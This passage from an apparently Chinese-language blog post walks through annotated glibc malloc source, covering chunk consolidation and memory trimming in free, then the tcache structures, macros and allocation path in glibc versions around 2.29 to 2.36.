中有太多零零碎碎的内存块，合并之后可以用来应对更大的内存块请求。合并的主要顺序为</p><ol><li>先考虑物理低地址空闲块</li><li>后考虑物理高地址空闲块</li></ol><p><strong>合并后的 chunk 指向合并的 chunk 的低地址。</strong> </p><p>在没有锁的情况下，先获得锁。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  Consolidate other non-mmapped chunks as they arrive.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123;<br>    <span class="hljs-keyword">if</span> (!have_lock) &#123;<br>        __libc_lock_lock(av-&gt;mutex);<br>        locked = <span class="hljs-number">1</span>;<br>    &#125;<br>    nextchunk = chunk_at_offset(p, size);<br></code></pre></div></td></tr></table></figure><h4 id="轻量级的检测"><a href="#轻量级的检测" class="headerlink" title="轻量级的检测"></a>轻量级的检测</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Lightweight tests: check whether the block is already the</span><br><span class="hljs-comment">   top block.  */</span><br><span class="hljs-comment">// 当前free的chunk不能是top chunk</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely(p == av-&gt;top)) &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br><span class="hljs-comment">// 当前free的chunk的下一个chunk不能超过arena的边界</span><br><span class="hljs-comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span><br><span class="hljs-keyword">if</span> (__builtin_expect(contiguous(av) &amp;&amp;<br>                         (<span class="hljs-keyword">char</span> *) nextchunk &gt;=<br>                             ((<span class="hljs-keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)),<br>                     <span class="hljs-number">0</span>)) &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (out)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br><span class="hljs-comment">// 当前要free的chunk的使用标记没有被标记，double free</span><br><span class="hljs-comment">/* Or whether the block is actually not marked used.  */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely(!prev_inuse(nextchunk))) &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br><span class="hljs-comment">// 下一个chunk的大小</span><br>nextsize = chunksize(nextchunk);<br><span class="hljs-comment">// next chunk size valid check</span><br><span class="hljs-comment">// 判断下一个chunk的大小是否不大于2*SIZE_SZ，或者</span><br><span class="hljs-comment">// nextsize是否大于系统可提供的内存</span><br><span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask(nextchunk) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) ||<br>    __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>)) &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="释放填充"><a href="#释放填充" class="headerlink" title="释放填充"></a>释放填充</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">      <span class="hljs-comment">//将指针的mem部分全部设置为perturb_byte        </span><br>free_perturb(chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br></code></pre></div></td></tr></table></figure><h4 id="后向合并-合并低地址-chunk"><a href="#后向合并-合并低地址-chunk" class="headerlink" title="后向合并 - 合并低地址 chunk"></a>后向合并 - 合并低地址 chunk</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-comment">/* consolidate backward */</span>        <br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;            <br>    prevsize = prev_size(p);            <br>    size += prevsize;            <br>    p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));            <br>    unlink(av, p, bck, fwd);        <br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="前向合并-下一块不是-top-chunk-放入unsorted"><a href="#前向合并-下一块不是-top-chunk-放入unsorted" class="headerlink" title="前向合并 - 下一块不是 top chunk, 放入unsorted"></a>前向合并 - 下一块不是 top chunk, 放入unsorted</h4><p>需要注意的是，如果下一块不是 top chunk ，则合并，并将合并后的 chunk 放入到 unsorted bin 中。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// 如果下一个chunk不是top chunk</span><br><span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>    <span class="hljs-comment">/* get and clear inuse bit */</span><br>    <span class="hljs-comment">// 获取下一个 chunk 的使用状态</span><br>    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br>    <span class="hljs-comment">// 如果不在使用，合并，否则清空当前chunk的使用状态。</span><br>    <span class="hljs-comment">/* consolidate forward */</span><br>    <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>        unlink(av, nextchunk, bck, fwd);<br>        size += nextsize;<br>    &#125; <span class="hljs-keyword">else</span><br>        clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">  Place the chunk in unsorted chunk list. Chunks are</span><br><span class="hljs-comment">  not placed into regular bins until after they have</span><br><span class="hljs-comment">  been given one chance to be used in malloc.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">// 把 chunk 放在 unsorted chunk 链表的头部</span><br>    bck = unsorted_chunks(av);<br>    fwd = bck-&gt;fd;<br>    <span class="hljs-comment">// 简单的检查</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    p-&gt;fd = fwd;<br>    p-&gt;bk = bck;<br>    <span class="hljs-comment">// 如果是 large chunk，那就设置nextsize指针字段为NULL。</span><br>    <span class="hljs-keyword">if</span> (!in_smallbin_range(size)) &#123;<br>        p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>        p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    bck-&gt;fd = p;<br>    fwd-&gt;bk = p;<br><br>    set_head(p, size | PREV_INUSE);<br>    set_foot(p, size);<br><br>    check_free_chunk(av, p);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="下一块是-top-chunk-合并到-top-chunk"><a href="#下一块是-top-chunk-合并到-top-chunk" class="headerlink" title="下一块是 top chunk - 合并到 top chunk"></a>下一块是 top chunk - 合并到 top chunk</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  If the chunk borders the current high end of memory,</span><br><span class="hljs-comment">  consolidate into top</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">// 如果要释放的chunk的下一个chunk是top chunk，那就合并到 top chunk</span><br><span class="hljs-keyword">else</span> &#123;<br>    size += nextsize;<br>    set_head(p, size | PREV_INUSE);<br>    av-&gt;top = p;<br>    <span class="hljs-comment">//只用于DE<span class="hljs-doctag">BUG:</span></span><br>    check_chunk(av, p);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="向系统返还内存"><a href="#向系统返还内存" class="headerlink" title="向系统返还内存"></a>向系统返还内存</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          If freeing a large space, consolidate possibly-surrounding</span><br><span class="hljs-comment">          chunks. Then, if the total unused topmost memory exceeds trim</span><br><span class="hljs-comment">          threshold, ask malloc_trim to reduce top.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          Unless max_fast is 0, we don&#x27;t know if there are fastbins</span><br><span class="hljs-comment">          bordering top, so we cannot tell for sure whether threshold</span><br><span class="hljs-comment">          has been reached unless fastbins are consolidated.  But we</span><br><span class="hljs-comment">          don&#x27;t want to consolidate on each free.  As a compromise,</span><br><span class="hljs-comment">          consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span><br><span class="hljs-comment">          is reached.</span><br><span class="hljs-comment">        */</span><br>         <span class="hljs-comment">// 如果合并后的 chunk 的大小大于FASTBIN_CONSOLIDATION_THRESHOLD</span><br>         <span class="hljs-comment">// (一般合并到 top chunk 都会执行这部分代码)</span><br>         <span class="hljs-comment">// 那就向系统返还内存</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;<br>            <span class="hljs-comment">// 如果有 fast chunk 就进行合并</span><br>            <span class="hljs-keyword">if</span> (have_fastchunks(av)) malloc_consolidate(av);<br>            <span class="hljs-comment">// 主分配区</span><br>            <span class="hljs-keyword">if</span> (av == &amp;main_arena) &#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br>                <span class="hljs-comment">// top chunk 大于当前的收缩阙值</span><br>                <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (chunksize(av-&gt;top)) &gt;=<br>                    (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (mp_.trim_threshold))<br>                    systrim(mp_.top_pad, av);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span>      <span class="hljs-comment">// 非主分配区，则直接收缩heap</span></span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">/* Always try heap_trim(), even if the top chunk is not</span><br><span class="hljs-comment">                   large, because the corresponding heap might go away.  */</span><br>                heap_info *heap = heap_for_ptr(top(av));<br><br>                assert(heap-&gt;ar_ptr == av);<br>                heap_trim(heap, mp_.top_pad);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!have_lock) &#123;<br>            assert(locked);<br>            __libc_lock_unlock(av-&gt;mutex);<br>        &#125;<br></code></pre></div></td></tr></table></figure><h3 id="释放-mmap-的-chunk"><a href="#释放-mmap-的-chunk" class="headerlink" title="释放 mmap 的 chunk"></a>释放 mmap 的 chunk</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//  If the chunk was allocated via mmap, release via munmap().</span><br>    munmap_chunk(p);<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h1><h2 id="两个struct"><a href="#两个struct" class="headerlink" title="两个struct"></a>两个struct</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><span class="hljs-comment">//指向的user-date部分嗷</span><br>&#125; tcache_entry;<br><br><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-keyword">static</span> __thread <span class="hljs-keyword">char</span> tcache_shutting_down = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br></code></pre></div></td></tr></table></figure><p>每个 thread 都会维护一个 <code>tcache_perthread_struct</code>，它是整个 tcache 的管理结构，一共有 <code>TCACHE_MAX_BINS</code> 个计数器和 <code>TCACHE_MAX_BINS</code>项 tcache_entry，其中</p><ul><li><code>tcache_entry</code> 用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk，这一点上和 fastbin 很像。</li><li><code>counts</code> 记录了 <code>tcache_entry</code> 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk。</li></ul><p><strong><mark>注意!!</mark></strong> </p><ul><li>2.29开始tcache_entry的结构发生改变:</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span><br>&#125; tcache_entry;<br></code></pre></div></td></tr></table></figure><ul><li>tcache的chunk管理是通过mem指针操作的, 所以有个chunk2mem()函数在开头.</li></ul><h2 id="基本宏定义"><a href="#基本宏定义" class="headerlink" title="基本宏定义"></a>基本宏定义</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_MAX_BINS64</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span><br><br><span class="hljs-comment">/* Only used to pre-fill the tunables.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><br><span class="hljs-comment">/* When &quot;x&quot; is from chunksize().  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="hljs-comment">/* When &quot;x&quot; is a user-provided size.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span><br><br><span class="hljs-comment">/* With rounding and alignment, the bins are...</span><br><span class="hljs-comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="hljs-comment">   idx 1   bytes 25..40 or 13..20</span><br><span class="hljs-comment">   idx 2   bytes 41..56 or 21..28</span><br><span class="hljs-comment">   etc.  */</span><br><br><span class="hljs-comment">/* This is another arbitrary limit, which tunables can change.  Each</span><br><span class="hljs-comment">   tcache bin will hold at most this number of chunks.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_FILL_COUNT 7</span><br></code></pre></div></td></tr></table></figure><ul><li>Tcache为每个线程都预留了这样一个特殊的bins， bin的数量是64个 每个bin中最多缓存7个chunk。在64位系统上以0x10的字节递增，<strong>从24递增到1032字节</strong>。32位系统上则<strong>从12到512字节</strong>，所以Tcache缓存的是<strong>非Large Chunk的chunk</strong> </li></ul><h2 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h2><ul><li>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code> 。</li><li>free 内存，且 size 小于 small bin size 时</li><li>tcache 之前会放到 fastbin 或者 unsorted bin 中 </li><li>tcache 后：<ul><li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）</li><li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li><li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li></ul></li><li>malloc 内存，且 size 在 tcache 范围内</li><li>先从 tcache 取 chunk，直到 tcache 为空 </li><li>tcache 为空后，从 bin 中找</li><li>tcache 为空时，如果 <code>fastbin/smallbin/unsorted bin</code> 中有 size 符合的 chunk，会先把 <code>fastbin/smallbin/unsorted bin</code> 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li></ul><h2 id="各个函数中关于tcache的部分"><a href="#各个函数中关于tcache的部分" class="headerlink" title="各个函数中关于tcache的部分"></a>各个函数中关于tcache的部分</h2><h3 id="tcache-init"><a href="#tcache-init" class="headerlink" title="tcache_init"></a>tcache_init</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">tcache_init(<span class="hljs-keyword">void</span>)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-keyword">void</span> *victim = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">size_t</span> bytes = <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct);<br>    <br>  <span class="hljs-keyword">if</span> (tcache_shutting_down)<br>    <span class="hljs-keyword">return</span>;<br>    <br>  arena_get (ar_ptr, bytes); <span class="hljs-comment">// 找到可用的 arena</span><br>  victim = _int_malloc (ar_ptr, bytes); <span class="hljs-comment">// 申请一个 sizeof(tcache_perthread_struct) 大小的 chunk</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<span class="hljs-comment">//这是.....不成功再来一遍?????</span><br>    &#123;<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br>    <br>  <span class="hljs-comment">/* In a low memory situation, we may not be able to allocate memory</span><br><span class="hljs-comment">     - in which case, we just keep trying later.  However, we</span><br><span class="hljs-comment">     typically do this very early, so either there is sufficient</span><br><span class="hljs-comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span><br><span class="hljs-comment">     allocations anyway.  */</span><br>    <span class="hljs-comment">//注释说如果取不到的话就等会再试, 通常在内存空间小的情况下</span><br>  <span class="hljs-keyword">if</span> (victim) <span class="hljs-comment">// 初始化 tcache</span><br>    &#123;<br>      tcache = (tcache_perthread_struct *) victim;<br>      <span class="hljs-built_in">memset</span> (tcache, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct));<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAYBE_INIT_TCACHE() \</span><br><span class="hljs-meta">  <span class="hljs-meta-keyword">if</span> (__glibc_unlikely (tcache == NULL)) \</span><br><span class="hljs-meta">    tcache_init();</span><br></code></pre></div></td></tr></table></figure><h3 id="–libc-malloc-1"><a href="#–libc-malloc-1" class="headerlink" title="–libc-malloc  "></a><a href="#__libc_malloc">–libc-malloc</a> <span id="libcmalloc"> </span></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">void</span> *<br>__libc_malloc (<span class="hljs-keyword">size_t</span> bytes)<br>&#123;<br>    ......<br>    ......<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-keyword">size_t</span> tbytes;<br>  <span class="hljs-comment">// 根据 malloc 传入的参数计算 chunk 实际大小，并计算 tcache 对应的下标</span><br>  checked_request2size (bytes, tbytes);<br>  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (tbytes);<br><br>  <span class="hljs-comment">// 初始化 tcache</span><br>  MAYBE_INIT_TCACHE (); <span class="hljs-comment">//如果为空就执行初始化函数</span><br>  DIAG_PUSH_NEEDS_COMMENT;<br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins  <span class="hljs-comment">// 根据 size 得到的 idx 在合法的范围内</span><br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">// tcache-&gt;entries[tc_idx] 有 chunk</span><br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    ......<br>    ......<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="int-malloc-2-36"><a href="#int-malloc-2-36" class="headerlink" title="_int_malloc 2.36"></a>_int_malloc <u>2.36</u></h3><p>（1）首先，申请的内存块符合 fastbin 大小时并且在 fastbin 内找到可用的空闲块时，会把该 fastbin 链上的其他内存块放入 tcache 中。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>      <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment"> stash them in the tcache.  */</span><br>      <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb);<br>      <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>&#123;<br>  mchunkptr tc_victim;<br><br>  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span><br>  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; 